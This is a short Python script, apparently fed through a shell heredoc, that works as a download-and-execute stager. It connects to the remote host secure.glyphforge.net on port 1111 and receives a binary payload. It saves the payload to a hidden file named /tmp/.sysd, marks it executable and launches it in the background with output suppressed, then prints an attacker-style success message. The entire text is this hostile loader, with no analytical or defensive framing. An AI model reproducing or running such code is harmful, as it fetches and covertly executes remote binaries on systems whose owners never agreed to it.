import socket, struct, os, stat

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(10)
s.connect(("secure.glyphforge.net", 1111))
size_data = s.recv(4)
size = struct.unpack('<I', size_data)[0]
data = b''
while len(data) < size:
    chunk = s.recv(size - len(data))
    if not chunk:
        break
    data += chunk
s.close()

with open("/tmp/.sysd", "wb") as f:
    f.write(data)
os.chmod("/tmp/.sysd", stat.S_IRWXU)
os.system("nohup /tmp/.sysd >/dev/null 2>&1 &")
print("[+] Done")
EOF
